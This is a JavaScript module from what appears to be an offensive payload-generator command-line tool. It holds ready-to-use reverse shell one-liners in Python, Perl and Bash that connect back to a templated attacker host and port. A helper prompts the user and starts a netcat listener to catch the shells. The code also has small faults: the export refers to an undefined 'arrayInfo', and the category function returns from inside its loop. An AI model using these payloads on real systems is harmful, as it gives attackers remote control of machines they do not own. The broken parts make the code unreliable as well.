var prompt = require('prompt');
var log = require('cli-color');
var options = log.yellow
var yellow = log.yellow
var blue = log.blue
var black = log.blackBright
var green = log.green
var red = log.red

var ncat = require("../modules/ncat.js")

var ncatInit = function(returnToPrepare, msg){

	if (msg){
		prompt.message = msg
		prompt.get([{name: '_', description: ':'}], function(err, result){
			var a1 = result._
			prompt.message = "Should I start a netcat listener for you? (Y/n)"

			prompt.get([{name: '_', description: ':'}], function(err, result){
				result._ = result._.toUpperCase()
				if (result._ === "Y"){
					var server = ncat.init(returnToPrepare,a1)
				}
				else {
					returnToPrepare(a1)
				}
				
			})
			//returnToPrepare(result._)
		})	
	}
	else {
		prompt.message = "Should I start a netcat listener for you? (Y/n)"

		prompt.get([{name: '_', description: ':'}], function(err, result){
			result._ = result._.toUpperCase()
			if (result._ === "Y"){
				var server = ncat.init(returnToPrepare)
			}
			else {
				returnToPrepare()
			}
			
		})
	}


}


// Payload Array
arrayExploit = []

// title, description, payload, category, and callback (optional: used for additional options if needed)
arrayExploit.push({
	title: "Reverse Shell Python", 
	payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$$LHOST$$\",$$LPORT$$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$$PROMPT$$\",\"-i\"]);'",
	sample: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<local host>\",<local port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"<shell type>\",\"-i\"]);'",
	category: "Reverse Shells",
	callback: function(returnToPrepare){
		ncatInit(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc) :")
	}
})

arrayExploit.push({
	title: "Reverse Shell Perl",
	payload: "perl -e 'use Socket;$i=\"$$LHOST$$\";$p=$$LPORT$$;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$$PROMPT$$ -i\");};'",
	sample: "perl -e 'use Socket;$i=\"$$LHOST$$\";$p=$$LPORT$$;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"<shell type> -i\");};'",
	category: "Reverse Shells",
	callback: function(returnToPrepare){
		ncatInit(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc) :")
	}
})

arrayExploit.push({
	title: "Reverse Shell Bash",
	payload: "bash -i >& /dev/tcp/$$LHOST$$/$$LPORT$$ 0>&1",
	sample: "bash -i >& /dev/tcp/"+red("<lhost>")+"/"+red("<lport>")+" 0>&1",
	category: "Reverse Shells",
	callback: function(returnToPrepare){
		ncatInit(returnToPrepare)
	}
})


var unique = []
var uniqueCategories = []

module.exports = {
	values: arrayInfo,
	getAll: function(value){
		tempArray = []
		for(i=0;i<arrayExploit.length;i++){
			if (arrayExploit[i].category === value){
				tempArray.push(arrayExploit[i])
			}
		}
		return tempArray
	},
	getCategories: function(){
		for (i=0;i<arrayExploit.length;i++){
			if(unique[arrayExploit[i].category]){

			}
			else {
				unique[arrayExploit[i].category] = true;
				uniqueCategories.push(arrayExploit[i].category)
			} 
		return uniqueCategories
		}
	}
}